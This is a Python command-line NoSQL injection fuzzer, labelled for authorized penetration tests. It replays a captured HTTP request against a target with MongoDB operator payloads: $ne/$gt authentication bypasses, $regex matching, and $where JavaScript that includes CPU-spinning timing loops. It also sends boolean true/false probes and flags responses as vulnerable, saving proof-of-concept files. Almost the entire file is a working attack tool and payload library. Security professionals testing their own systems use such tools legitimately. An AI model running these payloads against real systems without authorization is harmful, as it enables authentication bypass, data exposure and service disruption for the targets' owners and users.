#!/usr/bin/env python3
"""
nosql.py - NoSQL Injection Fuzzer for Authorized Pentests
Author: Generated for authorized security testing only
Usage:  python3 nosql.py -r req.txt -p param1,param2 [options]
"""

import argparse
import copy
import json
import os
import re
import sys
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from typing import Any

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ──────────────────────────────────────────────
# ANSI colours
# ──────────────────────────────────────────────
R  = "\033[91m"   # red    – hit
G  = "\033[92m"   # green  – baseline / ok
Y  = "\033[93m"   # yellow – anomaly
B  = "\033[94m"   # blue   – info
W  = "\033[97m"   # white
DIM= "\033[2m"
RST= "\033[0m"

BANNER = f"""{B}
  _   _       ____   ___  _        _____ _   _ ____________
 | \\ | | ___ / ___| / _ \\| |      |  ___| | | |___  /___  /
 |  \\| |/ _ \\\\___ \\| | | | |      | |_  | | | |  / /   / /
 | |\\  | (_) |___) | |_| | |___   |  _| | |_| | / /   / /
 |_| \\_|\\___/|____/ \\__\\_\\_____|  |_|    \\___/ /_/   /_/
{DIM}  Authorized NoSQL Injection Fuzzer | Use Responsibly{RST}
"""

# ──────────────────────────────────────────────
# PAYLOAD LIBRARY
# ──────────────────────────────────────────────
MONGO_OPERATOR_PAYLOADS = [
    # Boolean / auth-bypass operators
    {"$gt": ""},
    {"$gt": 0},
    {"$ne": "invalid"},
    {"$ne": None},
    {"$gte": ""},
    {"$lt": "z"},
    {"$lte": "z"},
    {"$exists": True},
    {"$in": ["admin", "user", "root", ""]},
    {"$nin": ["fakevalue"]},
    {"$regex": ".*"},
    {"$regex": "^a"},
    {"$regex": "^"},
    # Type confusion
    {"$where": "1==1"},
    {"$where": "true"},
    {"$where": "function(){return true;}"},
    # Nullbyte / nested
    "\x00",
    {"$gt": "", "$lt": "zzzzzz"},
]

BLIND_TIMING_PAYLOADS = [
    # Mongo $where sleep (JS engine)
    {"$where": "function(){var d=new Date();while(new Date()-d<5000){}return true;}"},
    {"$where": "sleep(5000)||1==1"},
    # Mongo $where CPU spin
    {"$where": "function(){var i=0;while(i<999999){i++;}return true;}"},
]

BOOLEAN_PAYLOADS_TRUE = [
    {"$gt": ""},
    {"$ne": "x_nosuchvalue_x"},
    {"$exists": True},
    {"$regex": ".*"},
]

BOOLEAN_PAYLOADS_FALSE = [
    {"$gt": "zzzzzzzzzzzzzz"},
    {"$ne": ""},
    {"$exists": False},
    {"$regex": "^ZZZNOMATCH$"},
]

# URL-encoded / query-string style (for GET params or form bodies)
QUERYSTRING_PAYLOADS = [
    # Array confusion
    "[%24gt]=",
    "[%24ne]=invalid",
    "[%24exists]=true",
    "[%24regex]=.*",
    "[%24gt]=0",
    "[$gt]=",
    "[$ne]=invalid",
    "[$exists]=true",
    "[$regex]=.*",
    # Mongo error-triggering
    "[%24where]=1==1",
    "[%24where]=function(){return true;}",
]

ERROR_SIGNATURES = [
    "MongoError", "MongoServerError", "CastError", "ValidationError",
    "BSONTypeError", "mongoose", "mongodb", "Mongoose",
    "SyntaxError", "TypeError: Cannot", "UnhandledPromiseRejection",
    "BSON", "$where", "operator", "query failed",
    # Go specific mongo drivers
    "mongo-driver", "mgo ", "qmgo",
]

CONTENT_TYPES = {
    "json":    "application/json",
    "form":    "application/x-www-form-urlencoded",
    "unknown": "application/json",
}

# ──────────────────────────────────────────────
# REQUEST PARSER
# ──────────────────────────────────────────────

def parse_raw_request(path: str):
    """Parse a Burp-style raw HTTP request file."""
    with open(path, "r", errors="replace") as fh:
        raw = fh.read()

    lines = raw.split("\n")
    request_line = lines[0].strip()
    parts = request_line.split(" ")
    method = parts[0].upper()
    path_qs = parts[1] if len(parts) > 1 else "/"

    headers = {}
    i = 1
    while i < len(lines) and lines[i].strip():
        if ":" in lines[i]:
            k, v = lines[i].split(":", 1)
            headers[k.strip()] = v.strip()
        i += 1

    body = "\n".join(lines[i+1:]).strip()

    host = headers.get("Host", "localhost")
    scheme = "https" if headers.get("X-Forwarded-Proto") == "https" else \
             ("https" if int(headers.get("Port", 443)) == 443 else "http")
    # Default to https for pentest targets
    url = f"https://{host}{path_qs}"

    # Detect body type
    ct = headers.get("Content-Type", "")
    if "json" in ct:
        body_type = "json"
    elif "form" in ct:
        body_type = "form"
    else:
        body_type = "unknown"

    return {
        "method":    method,
        "url":       url,
        "headers":   headers,
        "body":      body,
        "body_type": body_type,
    }


def parse_body(raw_body: str, body_type: str):
    if not raw_body:
        return None, body_type
    if body_type == "json":
        try:
            return json.loads(raw_body), "json"
        except Exception:
            pass
    if body_type == "form" or "=" in raw_body:
        parsed = urllib.parse.parse_qs(raw_body, keep_blank_values=True)
        flat = {k: v[0] for k, v in parsed.items()}
        return flat, "form"
    # Try JSON anyway
    try:
        return json.loads(raw_body), "json"
    except Exception:
        return raw_body, "raw"


def inject_payload(data: Any, param: str, payload: Any, body_type: str):
    """Deep-copy data and inject payload at the specified param key."""
    mutated = copy.deepcopy(data)
    if isinstance(mutated, dict):
        if param in mutated:
            mutated[param] = payload
        else:
            # Nested key support: "user.password" -> {"user": {"password": payload}}
            keys = param.split(".")
            ref = mutated
            for k in keys[:-1]:
                ref = ref.setdefault(k, {})
            ref[keys[-1]] = payload
    return mutated


def body_to_string(data: Any, body_type: str) -> str:
    if body_type == "json":
        return json.dumps(data)
    if body_type == "form":
        return urllib.parse.urlencode(data)
    return str(data)


# ──────────────────────────────────────────────
# HTTP ENGINE
# ──────────────────────────────────────────────

def send_request(req_template: dict, body_str: str, proxy: str = None,
                 timeout: int = 12) -> dict:
    proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
    headers = dict(req_template["headers"])
    ct = req_template.get("body_type", "json")
    headers["Content-Type"] = CONTENT_TYPES.get(ct, "application/json")
    # Remove problematic headers
    for h in ["Content-Length", "Transfer-Encoding"]:
        headers.pop(h, None)

    t0 = time.time()
    try:
        resp = requests.request(
            method=req_template["method"],
            url=req_template["url"],
            headers=headers,
            data=body_str,
            proxies=proxies,
            verify=False,
            timeout=timeout,
            allow_redirects=False,
        )
        elapsed = time.time() - t0
        return {
            "status":  resp.status_code,
            "length":  len(resp.content),
            "time":    round(elapsed, 3),
            "body":    resp.text[:2000],
            "error":   None,
        }
    except requests.exceptions.Timeout:
        elapsed = time.time() - t0
        return {"status": 0, "length": 0, "time": round(elapsed, 3),
                "body": "", "error": "TIMEOUT"}
    except Exception as e:
        return {"status": 0, "length": 0, "time": round(time.time()-t0, 3),
                "body": "", "error": str(e)}


# ──────────────────────────────────────────────
# DETECTION LOGIC
# ──────────────────────────────────────────────

def detect_error_signatures(body: str) -> list:
    found = []
    for sig in ERROR_SIGNATURES:
        if sig.lower() in body.lower():
            found.append(sig)
    return found


def verdict(result: dict, baseline: dict, timing_threshold: float,
            param: str, payload: Any) -> dict:
    """
    Returns a verdict dict with level: CONFIRMED / POTENTIAL / FALSE_POSITIVE
    """
    status_diff   = result["status"] != baseline["status"]
    length_delta  = abs(result["length"] - baseline["length"])
    time_delta    = result["time"] - baseline["time"]
    errors        = detect_error_signatures(result["body"])
    timeout_hit   = result["error"] == "TIMEOUT"

    level = "FALSE_POSITIVE"
    reasons = []

    if timeout_hit and timing_threshold > 0:
        level = "CONFIRMED"
        reasons.append(f"Request timed out (timing injection likely, threshold={timing_threshold}s)")
    elif time_delta >= timing_threshold and timing_threshold > 0:
        level = "CONFIRMED"
        reasons.append(f"Time delta: +{time_delta:.2f}s (threshold={timing_threshold}s)")
    elif errors:
        level = "CONFIRMED"
        reasons.append(f"Error signatures in response: {errors}")
    elif status_diff and result["status"] in [200, 201, 302]:
        level = "CONFIRMED"
        reasons.append(f"Status changed: {baseline['status']} → {result['status']}")
    elif length_delta > 200 and status_diff:
        level = "POTENTIAL"
        reasons.append(f"Status+length anomaly: Δlength={length_delta}, status={result['status']}")
    elif length_delta > 500:
        level = "POTENTIAL"
        reasons.append(f"Large length delta: {length_delta} bytes")
    elif status_diff:
        level = "POTENTIAL"
        reasons.append(f"Status changed: {baseline['status']} → {result['status']}")

    return {
        "level":       level,
        "reasons":     reasons,
        "time_delta":  round(time_delta, 3),
        "length_delta": length_delta,
        "errors":      errors,
    }


# ──────────────────────────────────────────────
# POC GENERATOR
# ──────────────────────────────────────────────

def generate_poc(req_template: dict, param: str, payload: Any,
                 result: dict, verdict_info: dict, ts: str):
    filename = f"poc_{param}_{ts}.txt"
    with open(filename, "w") as fh:
        fh.write("=" * 60 + "\n")
        fh.write("NOSQL INJECTION - PROOF OF CONCEPT\n")
        fh.write(f"Generated: {datetime.now().isoformat()}\n")
        fh.write("=" * 60 + "\n\n")
        fh.write(f"Target URL   : {req_template['url']}\n")
        fh.write(f"Method       : {req_template['method']}\n")
        fh.write(f"Parameter    : {param}\n")
        fh.write(f"Verdict      : {verdict_info['level']}\n")
        fh.write(f"Reasons      : {'; '.join(verdict_info['reasons'])}\n\n")
        fh.write("--- PAYLOAD ---\n")
        fh.write(json.dumps(payload, indent=2) + "\n\n")
        fh.write("--- RESPONSE ---\n")
        fh.write(f"Status : {result['status']}\n")
        fh.write(f"Length : {result['length']}\n")
        fh.write(f"Time   : {result['time']}s\n\n")
        fh.write("--- RESPONSE BODY (excerpt) ---\n")
        fh.write(result["body"][:1000] + "\n")
    return filename


# ──────────────────────────────────────────────
# FUZZER CORE
# ──────────────────────────────────────────────

def fuzz_param(req_template: dict, param: str, parsed_body: Any,
               body_type: str, baseline: dict, proxy: str,
               timing_threshold: float, logger, ts: str) -> list:

    findings = []

    all_payloads = MONGO_OPERATOR_PAYLOADS + BLIND_TIMING_PAYLOADS

    for payload in all_payloads:
        mutated = inject_payload(parsed_body, param, payload, body_type)
        body_str = body_to_string(mutated, body_type)
        result = send_request(req_template, body_str, proxy)

        v = verdict(result, baseline, timing_threshold, param, payload)
        payload_repr = json.dumps(payload) if not isinstance(payload, str) else repr(payload)

        log_line = (
            f"[{v['level']:15s}] param={param} | payload={payload_repr[:60]:60s} | "
            f"status={result['status']} | len={result['length']} | "
            f"time={result['time']}s | Δt={v['time_delta']}s | "
            f"Δlen={v['length_delta']}"
        )
        if v["reasons"]:
            log_line += f" | REASONS: {'; '.join(v['reasons'])}"

        colour = {"CONFIRMED": R, "POTENTIAL": Y, "FALSE_POSITIVE": DIM}.get(v["level"], W)
        print(f"{colour}{log_line}{RST}")
        logger(log_line)

        if v["level"] in ("CONFIRMED", "POTENTIAL"):
            poc_file = generate_poc(req_template, param, payload, result, v, ts)
            msg = f"  >>> PoC saved: {poc_file}"
            print(f"{R}{msg}{RST}")
            logger(msg)
            findings.append({
                "param":   param,
                "payload": payload,
                "result":  result,
                "verdict": v,
                "poc":     poc_file,
            })

        # Small delay to avoid hammering
        time.sleep(0.15)

    # Boolean-based correlation test
    print(f"\n{B}[*] Running boolean correlation test for param: {param}{RST}")
    logger(f"[BOOL_TEST] param={param}")

    true_lengths  = []
    false_lengths = []

    for p in BOOLEAN_PAYLOADS_TRUE:
        mutated = inject_payload(parsed_body, param, p, body_type)
        r = send_request(req_template, body_to_string(mutated, body_type), proxy)
        true_lengths.append(r["length"])

    for p in BOOLEAN_PAYLOADS_FALSE:
        mutated = inject_payload(parsed_body, param, p, body_type)
        r = send_request(req_template, body_to_string(mutated, body_type), proxy)
        false_lengths.append(r["length"])

    avg_true  = sum(true_lengths)  / len(true_lengths)  if true_lengths  else 0
    avg_false = sum(false_lengths) / len(false_lengths) if false_lengths else 0
    bool_delta = abs(avg_true - avg_false)

    bool_msg = (f"[BOOL_RESULT] param={param} | avg_true_len={avg_true:.0f} | "
                f"avg_false_len={avg_false:.0f} | delta={bool_delta:.0f}")
    if bool_delta > 100:
        colour = Y if bool_delta < 300 else R
        bool_msg += " *** BOOLEAN INJECTION LIKELY ***"
        print(f"{colour}{bool_msg}{RST}")
        findings.append({
            "param":   param,
            "payload": "boolean-correlation",
            "result":  {"status": "N/A", "length": avg_true, "time": 0, "body": ""},
            "verdict": {"level": "POTENTIAL", "reasons": [f"Boolean delta={bool_delta:.0f}"],
                       "time_delta": 0, "length_delta": int(bool_delta), "errors": []},
            "poc":     None,
        })
    else:
        print(f"{DIM}{bool_msg}{RST}")
    logger(bool_msg)

    return findings


# ──────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────

def main():
    print(BANNER)

    parser = argparse.ArgumentParser(
        description="NoSQL Injection Fuzzer for authorized pentests"
    )
    parser.add_argument("-r",  "--request",   required=True,  help="Raw HTTP request file (Burp format)")
    parser.add_argument("-p",  "--params",    required=True,  help="Comma-separated params to fuzz")
    parser.add_argument("--proxy",            default=None,   help="Proxy (e.g. 127.0.0.1:8080)")
    parser.add_argument("--dbtype",           default="mongodb", choices=["mongodb", "generic"],
                        help="DB hint (default: mongodb)")
    parser.add_argument("--threads",          default=1, type=int, help="Threads (default: 1)")
    parser.add_argument("--timing-threshold", default=4.0, type=float,
                        help="Seconds delta to flag timing injection (default: 4.0)")
    parser.add_argument("-o", "--output",     default=None,   help="Log file prefix")
    args = parser.parse_args()

    ts         = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_file   = args.output or f"output-{ts}.log"
    params     = [p.strip() for p in args.params.split(",") if p.strip()]

    log_fh = open(log_file, "w")
    def logger(msg: str):
        log_fh.write(msg + "\n")
        log_fh.flush()

    logger(f"nosql.py started at {datetime.now().isoformat()}")
    logger(f"Target request: {args.request}")
    logger(f"Params: {params}")
    logger(f"Proxy: {args.proxy}")
    logger(f"Timing threshold: {args.timing_threshold}s")
    logger("-" * 80)

    # Parse request
    try:
        req_template = parse_raw_request(args.request)
    except FileNotFoundError:
        print(f"{R}[!] Request file not found: {args.request}{RST}")
        sys.exit(1)

    parsed_body, body_type = parse_body(req_template["body"], req_template["body_type"])

    print(f"{B}[*] Target  : {req_template['url']}{RST}")
    print(f"{B}[*] Method  : {req_template['method']}{RST}")
    print(f"{B}[*] BodyType: {body_type}{RST}")
    print(f"{B}[*] Params  : {params}{RST}")
    print(f"{B}[*] Proxy   : {args.proxy or 'none'}{RST}")
    print(f"{B}[*] Log     : {log_file}{RST}\n")

    # Baseline
    print(f"{G}[*] Getting baseline...{RST}")
    baseline = send_request(req_template, req_template["body"], args.proxy)
    if baseline["error"]:
        print(f"{R}[!] Baseline request failed: {baseline['error']}{RST}")
        print(f"{Y}[!] Continuing anyway — results may be unreliable.{RST}")
    else:
        print(f"{G}[+] Baseline — status={baseline['status']} | "
              f"len={baseline['length']} | time={baseline['time']}s{RST}\n")
    logger(f"[BASELINE] status={baseline['status']} len={baseline['length']} time={baseline['time']}s")

    # Fuzz
    all_findings = []
    for param in params:
        print(f"\n{W}{'='*60}{RST}")
        print(f"{W}[>>] Fuzzing parameter: {param}{RST}")
        print(f"{W}{'='*60}{RST}")
        logger(f"\n[PARAM] {param}")
        findings = fuzz_param(
            req_template, param, parsed_body, body_type,
            baseline, args.proxy, args.timing_threshold, logger, ts
        )
        all_findings.extend(findings)

    # Summary
    print(f"\n{W}{'='*60}{RST}")
    print(f"{W}  SUMMARY{RST}")
    print(f"{W}{'='*60}{RST}")
    logger("\n" + "="*60)
    logger("SUMMARY")
    logger("="*60)

    confirmed  = [f for f in all_findings if f["verdict"]["level"] == "CONFIRMED"]
    potential  = [f for f in all_findings if f["verdict"]["level"] == "POTENTIAL"]

    if not all_findings:
        print(f"{G}[+] No anomalies detected.{RST}")
        logger("[RESULT] No anomalies detected.")
    else:
        print(f"{R}[!] CONFIRMED findings : {len(confirmed)}{RST}")
        print(f"{Y}[~] POTENTIAL findings : {len(potential)}{RST}")
        for f in confirmed + potential:
            payload_repr = json.dumps(f['payload']) if not isinstance(f['payload'], str) else f['payload']
            line = (f"  [{f['verdict']['level']:9s}] param={f['param']} | "
                    f"payload={payload_repr[:50]} | "
                    f"reasons={'; '.join(f['verdict']['reasons'])}")
            if f.get("poc"):
                line += f" | poc={f['poc']}"
            colour = R if f["verdict"]["level"] == "CONFIRMED" else Y
            print(f"{colour}{line}{RST}")
            logger(line)

    print(f"\n{B}[*] Full log saved to: {log_file}{RST}")
    log_fh.close()


if __name__ == "__main__":
    main()
